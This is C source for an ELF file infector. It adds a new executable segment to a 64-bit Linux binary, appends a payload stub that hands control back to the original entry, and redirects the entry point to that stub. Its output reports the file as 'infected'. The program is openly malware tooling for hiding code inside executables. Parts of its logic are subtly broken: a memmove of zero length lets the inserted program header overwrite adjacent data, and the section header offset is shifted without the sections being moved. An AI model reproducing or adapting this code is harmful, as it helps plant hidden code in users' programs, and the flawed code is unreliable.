#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

// Payload to be injected
unsigned char payload[] = {
    0x50,                    // push rax
    0x48, 0xb8,             // movabs rax
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Original entry point address will be patched here
    0x48, 0x89, 0x44, 0x24, 0x08,  // mov [rsp+8], rax
    0x58,                    // pop rax
    0xc3                     // ret
};

// Function to print usage information
void print_usage(const char *program_name) {
    printf("Usage: %s <input_file> <output_file>\n", program_name);
    exit(1);
}

// Function to inject payload into the ELF file
int infect_elf(const char *input_file, const char *output_file) {
    int fd;
    struct stat st;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    void *map;
    size_t payload_size = sizeof(payload);

    // Open the input file
    fd = open(input_file, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    // Get file size
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return -1;
    }
    printf("[*] Original file size: %ld bytes\n", st.st_size);
    printf("[*] Payload size: %ld bytes\n", payload_size);

    // Map the file into memory
    map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return -1;
    }
    close(fd);

    // Parse ELF header
    ehdr = (Elf64_Ehdr *)map;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not a valid ELF file\n");
        munmap(map, st.st_size);
        return -1;
    }

    printf("[*] Original entry point: 0x%lx\n", ehdr->e_entry);

    // Find the program header
    phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);

    // Find the last loadable segment
    Elf64_Phdr *last_load = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            last_load = &phdr[i];
        }
    }

    if (!last_load) {
        fprintf(stderr, "No PT_LOAD segment found\n");
        munmap(map, st.st_size);
        return -1;
    }

    // Calculate new segment address with proper alignment
    uint64_t page_size = 0x1000;  // Standard page size
    uint64_t new_vaddr = (last_load->p_vaddr + last_load->p_memsz + page_size - 1) & ~(page_size - 1);
    uint64_t file_offset = (st.st_size + page_size - 1) & ~(page_size - 1);

    printf("[*] Last PT_LOAD segment ends at: 0x%lx\n", last_load->p_vaddr + last_load->p_memsz);
    printf("[*] New segment will be at: 0x%lx\n", new_vaddr);

    // Create output file with the additional space for alignment
    int out_fd = open(output_file, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out_fd < 0) {
        perror("open");
        munmap(map, st.st_size);
        return -1;
    }

    // Extend the file to include alignment padding
    if (ftruncate(out_fd, file_offset + payload_size) < 0) {
        perror("ftruncate");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    // Create new PT_LOAD segment
    Elf64_Phdr new_phdr;
    memset(&new_phdr, 0, sizeof(new_phdr));
    new_phdr.p_type = PT_LOAD;
    new_phdr.p_flags = PF_X | PF_R;  // Executable and readable
    new_phdr.p_offset = file_offset;
    new_phdr.p_vaddr = new_vaddr;
    new_phdr.p_paddr = new_vaddr;
    new_phdr.p_filesz = payload_size;
    new_phdr.p_memsz = payload_size;
    new_phdr.p_align = page_size;

    // Store original entry
    uint64_t original_entry = ehdr->e_entry;

    // Patch the payload with the original entry point
    *(uint64_t*)(&payload[3]) = original_entry;

    // Update ELF header
    ehdr->e_shoff += page_size;  // Adjust section header offset if it exists after the injection
    ehdr->e_entry = new_vaddr;   // Set new entry point to our payload

    // Make space for the new program header by moving existing ones
    memmove(&phdr[ehdr->e_phnum + 1], &phdr[ehdr->e_phnum], 
            (ehdr->e_phoff + ehdr->e_phentsize * ehdr->e_phnum) - 
            (ehdr->e_phoff + ehdr->e_phentsize * ehdr->e_phnum));

    // Insert the new program header
    memcpy(&phdr[ehdr->e_phnum], &new_phdr, sizeof(Elf64_Phdr));
    ehdr->e_phnum++;

    // Write the modified ELF content
    if (write(out_fd, map, st.st_size) != st.st_size) {
        perror("write");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    // Write alignment padding
    size_t padding_size = file_offset - st.st_size;
    char *padding = calloc(1, padding_size);
    if (write(out_fd, padding, padding_size) != padding_size) {
        perror("write padding");
        free(padding);
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }
    free(padding);

    // Write the payload
    if (write(out_fd, payload, payload_size) != payload_size) {
        perror("write payload");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    printf("[*] Original entry point: 0x%lx\n", original_entry);
    printf("[*] New entry point: 0x%lx\n", new_vaddr);
    printf("[*] Payload offset: 0x%lx\n", file_offset);
    printf("[*] File size before padding: %ld bytes\n", st.st_size);
    printf("[*] Padding size: %ld bytes\n", padding_size);
    printf("[*] Payload size: %ld bytes\n", payload_size);
    printf("[*] Total size: %ld bytes\n", file_offset + payload_size);

    // Clean up
    close(out_fd);
    munmap(map, st.st_size);

    printf("[+] File successfully infected and written to %s\n", output_file);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        print_usage(argv[0]);
    }

    const char *input_file = argv[1];
    const char *output_file = argv[2];

    if (infect_elf(input_file, output_file) < 0) {
        fprintf(stderr, "[-] Infection failed\n");
        return 1;
    }

    return 0;
}